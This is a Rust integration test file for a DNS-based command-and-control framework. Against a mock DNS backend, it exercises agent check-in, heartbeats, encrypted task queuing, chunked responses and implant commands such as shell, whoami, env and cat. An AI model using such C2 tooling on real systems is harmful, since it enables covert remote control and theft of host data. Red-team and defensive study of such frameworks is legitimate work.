//! Integration tests for the dns-c2 framework.
//!
//! Tests the full C2 lifecycle: session management, task queuing,
//! response handling (including chunked), and agent command execution.

use dns_c2::c2::{
    self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus,
};
use dns_c2::crypto;
use dns_c2::dns::mock::MockDnsBackend;

fn test_key() -> crypto::EncryptionKey {
    crypto::generate_key()
}

fn test_session(id: &str) -> SessionInfo {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    SessionInfo {
        session_id: id.to_string(),
        hostname: "testhost".to_string(),
        username: "testuser".to_string(),
        os: "linux".to_string(),
        arch: "x86_64".to_string(),
        pid: 1234,
        first_seen: now,
        last_seen: now,
    }
}

const DOMAIN: &str = "test.example.com";

// ─── Session Lifecycle ──────────────────────────────────────────────

#[tokio::test]
async fn test_check_in_creates_session() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("sess01");

    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let sessions = c2::list_sessions(&backend, DOMAIN, &key).await.unwrap();
    assert_eq!(sessions.len(), 1);
    assert_eq!(sessions[0].session_id, "sess01");
    assert_eq!(sessions[0].hostname, "testhost");
    assert_eq!(sessions[0].username, "testuser");
}

#[tokio::test]
async fn test_multiple_sessions() {
    let backend = MockDnsBackend::new();
    let key = test_key();

    for i in 0..3 {
        let info = test_session(&format!("s{i}"));
        c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();
    }

    let sessions = c2::list_sessions(&backend, DOMAIN, &key).await.unwrap();
    assert_eq!(sessions.len(), 3);
}

#[tokio::test]
async fn test_heartbeat_updates_last_seen() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("hb01");

    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let before = c2::list_sessions(&backend, DOMAIN, &key).await.unwrap();
    let ts_before = before[0].last_seen;

    // Small delay to ensure timestamp changes
    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;

    c2::heartbeat(&backend, DOMAIN, &key, "hb01").await.unwrap();

    let after = c2::list_sessions(&backend, DOMAIN, &key).await.unwrap();
    assert!(after[0].last_seen >= ts_before);
}

// ─── Task Queue ─────────────────────────────────────────────────────

#[tokio::test]
async fn test_poll_no_task() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("poll01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let task = c2::poll_task(&backend, DOMAIN, &key, "poll01").await.unwrap();
    assert!(task.is_none());
}

#[tokio::test]
async fn test_send_and_poll_task() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("task01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let task = Task {
        task_id: "t001".to_string(),
        command: "whoami".to_string(),
        args: vec![],
        timestamp: 0,
    };

    c2::send_task(&backend, DOMAIN, &key, "task01", &task).await.unwrap();

    let polled = c2::poll_task(&backend, DOMAIN, &key, "task01").await.unwrap();
    assert!(polled.is_some());
    let polled = polled.unwrap();
    assert_eq!(polled.task_id, "t001");
    assert_eq!(polled.command, "whoami");
}

#[tokio::test]
async fn test_send_task_to_nonexistent_session() {
    let backend = MockDnsBackend::new();
    let key = test_key();

    let task = Task {
        task_id: "t002".to_string(),
        command: "pwd".to_string(),
        args: vec![],
        timestamp: 0,
    };

    let result = c2::send_task(&backend, DOMAIN, &key, "nonexistent", &task).await;
    assert!(result.is_err());
    match result.unwrap_err() {
        C2Error::SessionNotFound(id) => assert_eq!(id, "nonexistent"),
        other => panic!("expected SessionNotFound, got: {other}"),
    }
}

#[tokio::test]
async fn test_clear_task() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("clr01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let task = Task {
        task_id: "t003".to_string(),
        command: "ls".to_string(),
        args: vec!["/tmp".to_string()],
        timestamp: 0,
    };

    c2::send_task(&backend, DOMAIN, &key, "clr01", &task).await.unwrap();

    // Task exists
    assert!(c2::poll_task(&backend, DOMAIN, &key, "clr01").await.unwrap().is_some());

    // Clear it
    c2::clear_task(&backend, DOMAIN, "clr01").await.unwrap();

    // Gone
    assert!(c2::poll_task(&backend, DOMAIN, &key, "clr01").await.unwrap().is_none());
}

// ─── Response Handling ──────────────────────────────────────────────

#[tokio::test]
async fn test_submit_and_read_response() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("resp01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let response = TaskResponse {
        task_id: "t010".to_string(),
        status: TaskStatus::Success,
        output: "testuser".to_string(),
        timestamp: 0,
    };

    c2::submit_response(&backend, DOMAIN, &key, "resp01", &response).await.unwrap();

    let read = c2::read_response(&backend, DOMAIN, &key, "resp01", "t010").await.unwrap();
    assert!(read.is_some());
    let read = read.unwrap();
    assert_eq!(read.task_id, "t010");
    assert_eq!(read.output, "testuser");
    assert!(matches!(read.status, TaskStatus::Success));
}

#[tokio::test]
async fn test_read_missing_response() {
    let backend = MockDnsBackend::new();
    let key = test_key();

    let result = c2::read_response(&backend, DOMAIN, &key, "none", "t999").await.unwrap();
    assert!(result.is_none());
}

#[tokio::test]
async fn test_chunked_response() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("chunk01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    // Create a large output that exceeds MAX_SINGLE_CLEARTEXT (1500 bytes)
    let large_output = "A".repeat(3000);

    let response = TaskResponse {
        task_id: "t020".to_string(),
        status: TaskStatus::Success,
        output: large_output.clone(),
        timestamp: 12345,
    };

    c2::submit_response(&backend, DOMAIN, &key, "chunk01", &response).await.unwrap();

    let read = c2::read_response(&backend, DOMAIN, &key, "chunk01", "t020").await.unwrap();
    assert!(read.is_some());
    let read = read.unwrap();
    assert_eq!(read.task_id, "t020");
    assert_eq!(read.output, large_output);
}

#[tokio::test]
async fn test_error_response() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("err01");
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    let response = TaskResponse {
        task_id: "t030".to_string(),
        status: TaskStatus::Error,
        output: "command not found: foobar".to_string(),
        timestamp: 0,
    };

    c2::submit_response(&backend, DOMAIN, &key, "err01", &response).await.unwrap();

    let read = c2::read_response(&backend, DOMAIN, &key, "err01", "t030").await.unwrap();
    let read = read.unwrap();
    assert!(matches!(read.status, TaskStatus::Error));
    assert_eq!(read.output, "command not found: foobar");
}

// ─── Full E2E Cycle ─────────────────────────────────────────────────

#[tokio::test]
async fn test_full_task_lifecycle() {
    let backend = MockDnsBackend::new();
    let key = test_key();
    let info = test_session("e2e01");

    // 1. Agent checks in
    c2::check_in(&backend, DOMAIN, &key, &info).await.unwrap();

    // 2. Operator sends task
    let task = Task {
        task_id: c2::generate_task_id(),
        command: "shell".to_string(),
        args: vec!["echo hello".to_string()],
        timestamp: 0,
    };
    c2::send_task(&backend, DOMAIN, &key, "e2e01", &task).await.unwrap();

    // 3. Agent polls and receives task
    let polled = c2::poll_task(&backend, DOMAIN, &key, "e2e01").await.unwrap().unwrap();
    assert_eq!(polled.command, "shell");

    // 4. Agent submits response
    let response = TaskResponse {
        task_id: polled.task_id.clone(),
        status: TaskStatus::Success,
        output: "hello\n".to_string(),
        timestamp: 0,
    };
    c2::submit_response(&backend, DOMAIN, &key, "e2e01", &response).await.unwrap();

    // 5. Operator reads response
    let result = c2::read_response(&backend, DOMAIN, &key, "e2e01", &polled.task_id)
        .await.unwrap().unwrap();
    assert_eq!(result.output, "hello\n");

    // 6. Agent clears task
    c2::clear_task(&backend, DOMAIN, "e2e01").await.unwrap();
    assert!(c2::poll_task(&backend, DOMAIN, &key, "e2e01").await.unwrap().is_none());
}

// ─── Crypto Isolation ───────────────────────────────────────────────

#[tokio::test]
async fn test_wrong_key_cannot_decrypt() {
    let backend = MockDnsBackend::new();
    let key1 = test_key();
    let key2 = test_key();

    let info = test_session("iso01");
    c2::check_in(&backend, DOMAIN, &key1, &info).await.unwrap();

    // Different key should fail to list sessions
    let sessions = c2::list_sessions(&backend, DOMAIN, &key2).await.unwrap();
    assert!(sessions.is_empty()); // decryption silently fails, returns empty
}

// ─── ID Generation ──────────────────────────────────────────────────

#[test]
fn test_task_id_uniqueness() {
    let ids: Vec<String> = (0..100).map(|_| c2::generate_task_id()).collect();
    let unique: std::collections::HashSet<&String> = ids.iter().collect();
    assert_eq!(ids.len(), unique.len());
}

#[test]
fn test_session_id_uniqueness() {
    let ids: Vec<String> = (0..100).map(|_| c2::generate_session_id()).collect();
    let unique: std::collections::HashSet<&String> = ids.iter().collect();
    assert_eq!(ids.len(), unique.len());
}

// ─── Agent Commands ─────────────────────────────────────────────────

#[test]
fn test_pwd_command() {
    let (status, output) = c2::commands::pwd();
    assert!(matches!(status, TaskStatus::Success));
    assert!(!output.is_empty());
}

#[test]
fn test_whoami_command() {
    let (status, output) = c2::commands::whoami();
    assert!(matches!(status, TaskStatus::Success));
    assert!(!output.is_empty());
}

#[test]
fn test_hostname_command() {
    let (status, output) = c2::commands::hostname();
    assert!(matches!(status, TaskStatus::Success));
    assert!(!output.is_empty());
}

#[test]
fn test_ls_command() {
    let (status, output) = c2::commands::ls(&["/tmp".to_string()]);
    assert!(matches!(status, TaskStatus::Success));
    // /tmp should exist on any Linux
    assert!(!output.contains("No such file"));
}

#[test]
fn test_ls_no_args_defaults_to_cwd() {
    let (status, output) = c2::commands::ls(&[]);
    assert!(matches!(status, TaskStatus::Success));
    assert!(!output.is_empty()); // current dir should have files
}

#[test]
fn test_cat_missing_args() {
    let (status, _output) = c2::commands::cat(&[]);
    assert!(matches!(status, TaskStatus::Error));
}

#[test]
fn test_shell_command() {
    let (status, output) = c2::commands::shell(&["echo test123".to_string()]);
    assert!(matches!(status, TaskStatus::Success));
    assert!(output.contains("test123"));
}

#[test]
fn test_shell_missing_args() {
    let (status, _output) = c2::commands::shell(&[]);
    assert!(matches!(status, TaskStatus::Error));
}

#[test]
fn test_env_command() {
    let (status, output) = c2::commands::env_cmd();
    assert!(matches!(status, TaskStatus::Success));
    // Should have at least PATH
    assert!(output.contains("PATH"));
}

#[test]
fn test_id_command() {
    let (status, output) = c2::commands::id();
    assert!(matches!(status, TaskStatus::Success));
    assert!(!output.is_empty());
}
